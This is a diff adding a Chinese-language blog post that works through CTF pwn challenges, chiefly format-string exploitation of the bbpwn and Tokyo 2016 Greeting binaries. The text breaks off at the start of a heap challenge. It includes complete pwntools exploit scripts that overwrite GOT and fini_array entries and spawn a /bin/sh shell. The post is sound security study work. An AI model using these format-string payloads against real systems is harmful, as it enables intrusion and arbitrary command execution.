@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="练习  Backdoor CTF bbpwn 这里是继续之前的文档学习，希望跟着这个把pwn的破解方式系统的地看一遍，应该都只是基础，但是目前来看进度还是满了，都和几个好兄弟玩游戏去了_ 文件下载 bbpwn2017 首先检查文件的保护机制和运行状况 12345678910111213    Arch:     i386-32-little    RELRO:    Partial RELRO">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn commonly training 2">
+<meta property="og:url" content="http://example.com/2023/01/16/pwn-commonly-break-2/index.html">
+<meta property="og:site_name" content="a0dy&#39;s Home">
+<meta property="og:description" content="练习  Backdoor CTF bbpwn 这里是继续之前的文档学习，希望跟着这个把pwn的破解方式系统的地看一遍，应该都只是基础，但是目前来看进度还是满了，都和几个好兄弟玩游戏去了_ 文件下载 bbpwn2017 首先检查文件的保护机制和运行状况 12345678910111213    Arch:     i386-32-little    RELRO:    Partial RELRO">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-01-16T10:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-19T09:40:34.666Z">
+<meta property="article:author" content="Andy">
+<meta property="article:tag" content="read document">
+<meta property="article:tag" content="training">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>pwn commonly training 2</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/01/22/picoctf-web-one/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/01/08/pwn-commonly-break/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/01/16/pwn-commonly-break-2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/01/16/pwn-commonly-break-2/&text=pwn commonly training 2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/01/16/pwn-commonly-break-2/&title=pwn commonly training 2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/01/16/pwn-commonly-break-2/&is_video=false&description=pwn commonly training 2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwn commonly training 2&body=Check out this article: http://example.com/2023/01/16/pwn-commonly-break-2/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/01/16/pwn-commonly-break-2/&title=pwn commonly training 2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/01/16/pwn-commonly-break-2/&title=pwn commonly training 2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/01/16/pwn-commonly-break-2/&title=pwn commonly training 2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/01/16/pwn-commonly-break-2/&title=pwn commonly training 2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/01/16/pwn-commonly-break-2/&name=pwn commonly training 2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/01/16/pwn-commonly-break-2/&t=pwn commonly training 2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text"> 练习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#backdoor-ctf-bbpwn"><span class="toc-number">1.1.</span> <span class="toc-text"> Backdoor CTF bbpwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tokyo-2016-greeting"><span class="toc-number">1.2.</span> <span class="toc-text"> Tokyo 2016 Greeting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csaw-doubletrouble"><span class="toc-number">1.3.</span> <span class="toc-text"> CSAW doubletrouble</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dream-heap"><span class="toc-number">1.4.</span> <span class="toc-text"> Dream Heap</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        pwn commonly training 2
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Andy</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-01-16T10:00:00.000Z" itemprop="datePublished">2023-01-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/read-document/" rel="tag">read document</a>, <a class="tag-link-link" href="/tags/training/" rel="tag">training</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="练习"><a class="markdownIt-Anchor" href="#练习"></a> 练习</h1>
+<h2 id="backdoor-ctf-bbpwn"><a class="markdownIt-Anchor" href="#backdoor-ctf-bbpwn"></a> Backdoor CTF bbpwn</h2>
+<p>这里是继续之前的文档学习，希望跟着这个把pwn的破解方式系统的地看一遍，应该都只是基础，但是目前来看进度还是满了，都和几个好兄弟玩游戏去了<sup>_</sup></p>
+<p>文件下载 <a href="/cyber/pwn/bbpwn2017">bbpwn2017</a></p>
+<p>首先检查文件的保护机制和运行状况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">32_new: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=da5e14c668579652906e8dd34223b8b5aa3becf8, not stripped</span><br><span class="line"></span><br><span class="line">==================execution=======================</span><br><span class="line">Hello baby pwner, whats your name?</span><br><span class="line">Andy</span><br><span class="line">Ok cool, soon we will know whether you pwned it or not. Till then Bye Andy</span><br></pre></td></tr></table></figure>
+<p>查看<code>main</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(undefined4 param_1,undefined4 param_2)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> in_GS_OFFSET;</span><br><span class="line">  <span class="type">char</span> local_208 [<span class="number">200</span>];</span><br><span class="line">  <span class="type">char</span> local_140 [<span class="number">300</span>];</span><br><span class="line">  undefined4 local_14;</span><br><span class="line">  undefined4 *puStack_c;</span><br><span class="line">  </span><br><span class="line">  puStack_c = &amp;param_1;</span><br><span class="line">  local_14 = *(undefined4 *)(in_GS_OFFSET + <span class="number">0x14</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello baby pwner, whats your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(local_208,<span class="number">200</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(local_140,<span class="string">&quot;Ok cool, soon we will know whether you pwned it or not. Till then Bye %s&quot;</span>,</span><br><span class="line">          local_208);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(local_140);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里是有一个格式化字符串漏洞通过<code>sprintf</code>间接赋值输出到<code>printf</code></p>
+<p>并且可以注意到解析函数里面有一个<code>flag</code>函数，函数的格式类型为<code>void flag(void)</code>，我们可以利用格式化字符串漏洞覆写GOT表，这是一个很好的思路，并且flag这个函数也不需要多余的参数需要我们去控制</p>
+<p>来个payload试试水发现got表已经能够随意改写了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/2w 0x804a028</span><br><span class="line">0x804a028 &lt;fflush@got.plt&gt;:     0x525252        0xf7b90000</span><br></pre></td></tr></table></figure>
+<p>我们需要覆盖得到数值是<code>flag</code>的地址<code>0x804870b</code>,由于这里地址在我电脑上是小端存储，对比字节计算可以通过%[n]x来修正数量</p>
+<blockquote>
+<p>这里的x修正最小只能加8，不过我们可以加大数，如果多出来的位覆盖了后面的位我们可以手动补正</p>
+</blockquote>
+<p>exp</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./32_new&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./32_new&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x80487dc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line">addr1=p32(elf.got[<span class="string">&#x27;fflush&#x27;</span>])</span><br><span class="line">addr2=p32(elf.got[<span class="string">&#x27;fflush&#x27;</span>]+<span class="number">1</span>)</span><br><span class="line">addr3=p32(elf.got[<span class="string">&#x27;fflush&#x27;</span>]+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u32(addr1)))</span><br><span class="line"></span><br><span class="line">filler1=<span class="string">b&#x27;%185x&#x27;</span></span><br><span class="line">filler2=<span class="string">b&#x27;%892x&#x27;</span></span><br><span class="line">filler3=<span class="string">b&#x27;%893x&#x27;</span></span><br><span class="line"></span><br><span class="line">fmt_str1=<span class="string">b&#x27;%10$n&#x27;</span></span><br><span class="line">fmt_str2=<span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line">fmt_str3=<span class="string">b&#x27;%12$n&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=addr1+addr2+addr3+filler1+fmt_str1+filler2+fmt_str2+filler3+fmt_str3</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="tokyo-2016-greeting"><a class="markdownIt-Anchor" href="#tokyo-2016-greeting"></a> Tokyo 2016 Greeting</h2>
+<p>greeting! witcher.<br />
+这个相比于上一题难度稍微提升，顺便记录记录</p>
+<p>文件下载: <a href="/cyber/pwn/tokyo2016greeting">greeting</a><br />
+先来看看文件保护机制和文件运行表现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">greeting: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=beb85611dbf6f1f3a943cecd99726e5e35065a63, not stripped</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=====================running======================</span><br><span class="line">Hello, I&#x27;m nao!</span><br><span class="line">Please tell me your name... </span><br><span class="line">Don&#x27;t ignore me ;( </span><br><span class="line">=====================running======================</span><br><span class="line">Hello, I&#x27;m nao!</span><br><span class="line">Please tell me your name... blueman</span><br><span class="line">Nice to meet you, blueman :)</span><br></pre></td></tr></table></figure>
+<p>再来分析分析主函数<code>main</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">int</span> in_GS_OFFSET;</span><br><span class="line">  <span class="type">char</span> printStr [<span class="number">64</span>];</span><br><span class="line">  <span class="type">char</span> name [<span class="number">64</span>];</span><br><span class="line">  <span class="type">int</span> canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(<span class="type">int</span> *)(in_GS_OFFSET + <span class="number">0x14</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please tell me your name... &quot;</span>);</span><br><span class="line">  size = getnline(name,<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Don\&#x27;t ignore me ;( &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(printStr,<span class="string">&quot;Nice to meet you, %s :)\n&quot;</span>,name);</span><br><span class="line">    <span class="built_in">printf</span>(printStr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (canary != *(<span class="type">int</span> *)(in_GS_OFFSET + <span class="number">0x14</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>getnline</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getnline</span><span class="params">(<span class="type">char</span> *name,<span class="type">int</span> len)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *retName;</span><br><span class="line">  <span class="type">size_t</span> retSize;</span><br><span class="line">  </span><br><span class="line">  fgets(name,len,<span class="built_in">stdin</span>);</span><br><span class="line">  retName = <span class="built_in">strchr</span>(name,<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> (retName != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    *retName = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  retSize = <span class="built_in">strlen</span>(name);</span><br><span class="line">  <span class="keyword">return</span> retSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一个比较有意思的函数<code>nao</code>，非常不错，这正是我们所需要的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">nao</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>,(<span class="type">char</span> *)<span class="number">0x0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>,(<span class="type">char</span> *)<span class="number">0x0</span>);</span><br><span class="line">  system(<span class="string">&quot;echo \&quot;Hello, I\&#x27;m nao\&quot;!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们已经掌握了其中的函数了，并且已经有一些可以利用的漏洞组合；<code>system</code>敏感函数的plt表地址为<code>0x8048490</code>;这里为了能够使程序循环用了<code>.fini_array segment</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line"> 18 .init_array   00000008  0804992c  0804992c  0000092c  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> 19 .fini_array   00000004  08049934  08049934  00000934  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure>
+<p>这里预选的loop address是<code>0x8048614</code></p>
+<p>测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello, I&#x27;m nao!</span><br><span class="line">Please tell me your name... 1111222233334444 %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br><span class="line">Nice to meet you, 1111222233334444 0x80487d0 0xffffcf7c 0x736877c4 0x79a0 0xf7ffda20 0xfffffbac 0x6563694e 0x206f7420 0x7465656d 0x756f7920 0x3131202c 0x32323131 0x33333232 0x34343333 0x25203434 :)</span><br></pre></td></tr></table></figure>
+<p>有点瑕疵我们对称一下字节,用<code>AA</code>来填充</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello, I&#x27;m nao!</span><br><span class="line">Please tell me your name... AA1111222233334444 %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br><span class="line">Nice to meet you, AA1111222233334444 0x80487d0 0xffffcf9c 0xc6679d3e 0x7a31 0xf7ffda20 0xfffffbac 0x6563694e 0x206f7420 0x7465656d 0x756f7920 0x4141202c 0x31313131 0x32323232 0x33333333 0x34343434 :)</span><br></pre></td></tr></table></figure>
+<p>我们得到了我们的格式化字符串参数位置,以及可控显示payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AA1111222233334444 %12$p %13$p %14$p %15$p</span><br></pre></td></tr></table></figure>
+<p>exp</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./greeting&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./greeting&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x0804864f&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fini_array=<span class="number">0x8049934</span></span><br><span class="line">strlen_got=<span class="number">0x8049a54</span></span><br><span class="line">loop_main=<span class="number">0x8048614</span></span><br><span class="line">system_plt=<span class="number">0x8048490</span></span><br><span class="line"></span><br><span class="line">filler0=<span class="string">b&#x27;AA&#x27;</span></span><br><span class="line">filler1=<span class="string">b&#x27;%34288x&#x27;</span></span><br><span class="line">filler2=<span class="string">b&#x27;%65148x&#x27;</span></span><br><span class="line">filler3=<span class="string">b&#x27;%33652x&#x27;</span></span><br><span class="line"></span><br><span class="line">fmt_str1=<span class="string">b&#x27;%12$n&#x27;</span></span><br><span class="line">fmt_str2=<span class="string">b&#x27;%13$n&#x27;</span></span><br><span class="line">fmt_str3=<span class="string">b&#x27;%14$n&#x27;</span></span><br><span class="line">fmt_str4=<span class="string">b&#x27;%15$n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite fini_array,and enter the loop</span></span><br><span class="line">payload=filler1+p32(fini_array)+p32(fini_array+<span class="number">2</span>)+p32(strlen_got)+p32(strlen_got+<span class="number">2</span>)+filler1+fmt_str1+filler2+fmt_str3+filler3+fmt_str2+fmt_str4</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="csaw-doubletrouble"><a class="markdownIt-Anchor" href="#csaw-doubletrouble"></a> CSAW doubletrouble</h2>
+<p>文件下载: <a href="/cyber/pwn/doubletrouble">doubletrouble</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">检测算术溢出</span><br><span class="line">SBORROW4(x,y)</span><br><span class="line">Return true if there is an arithmetic overflow when subtracting &#x27;y&#x27; from &#x27;x&#x27; as signed integers.</span><br><span class="line">====================================================================</span><br><span class="line">CONCAT31(x,y)</span><br><span class="line">CONCAT31(0xaabbcc,0xdd) = 0xaabbccdd </span><br><span class="line">Concatenate the bytes in &#x27;x&#x27; with the bytes in &#x27;y&#x27;. &#x27;x&#x27; becomes the most significant bytes, and &#x27;y&#x27; the least significant bytes, in the result.</span><br></pre></td></tr></table></figure>
+<p>这里concat44实在没办法转化为看起来正常的数据，索性再次优化了一下函数结构</p>
+<p>这里删了很多，做了一半发现这道题有点超出我目前的能力范围，题留这了，挖个坑，有时间填上吧；其实主要是学习数组指引漏洞，换个简单点记录吧</p>
+<p>不过这里倒是有一篇WP讲解可以借鉴一下，先放这里了</p>
+<p><a target="_blank" rel="noopener" href="https://hack.more.systems/writeup/2018/09/20/csawctfquals-doubletrouble/">CSAW’18 CTF Qualification Round: Doubletrouble</a></p>
+<h2 id="dream-heap"><a class="markdownIt-Anchor" href="#dream-heap"></a> Dream Heap</h2>
+<p>文件下载:<a href="/cyber/pwn/dream_heaps">dream_heaps</a></p>
+<p>这是一个关于数组越界的漏洞，这种漏洞还是挺常见的，这个是SwampCTF2019中的一道题，跟之前的题目的类型都不太一样，可以详细的记录一下解题过程</p>
+<p>先来简单的看看运行效果以及基本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 